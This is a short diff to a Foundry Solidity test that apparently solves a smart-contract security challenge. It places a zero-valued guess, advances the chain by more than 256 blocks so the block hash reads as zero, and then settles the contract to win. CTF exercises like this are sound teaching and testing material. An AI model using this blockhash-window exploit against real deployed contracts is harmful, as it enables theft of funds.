@@ -19,7 +19,10 @@ contract Challenge6Test is Test {
     function testChallenge() public {
         vm.startPrank(address(player));
 
-        // Tu codigo aqui
+        target.lockInGuess{value: 1 ether}(bytes32(uint256(0)));
+        vm.roll(block.number + 1 + 257);
+        target.settle();
+
         
         assertTrue(target.isComplete());
     }
